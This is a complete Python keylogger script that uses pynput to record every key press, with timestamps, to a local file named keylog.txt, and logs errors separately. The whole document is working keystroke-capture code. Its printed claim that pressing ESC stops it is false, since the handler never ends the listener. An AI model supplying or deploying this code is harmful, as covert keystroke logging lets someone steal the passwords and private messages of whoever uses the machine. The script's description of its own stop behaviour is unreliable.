from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

def key_pressed(key):
    try:
        with open(LOG_FILE, 'a') as logkey:
            # Log alphanumeric keys
            if hasattr(key, 'char'):
                logkey.write(f'{datetime.now()}: {key.char}\n')
            # Log special keys
            else:
                logkey.write(f'{datetime.now()}: [{key}]\n')
    except Exception as e:
        with open("errorlog.txt", 'a') as errorfile:
            errorfile.write(f'{datetime.now()}: Error - {e}\n')

if __name__ == "__main__":
    print("Keylogger is running. Press ESC to stop.")
    with keyboard.Listener(on_press=key_pressed) as listener:
        listener.join()
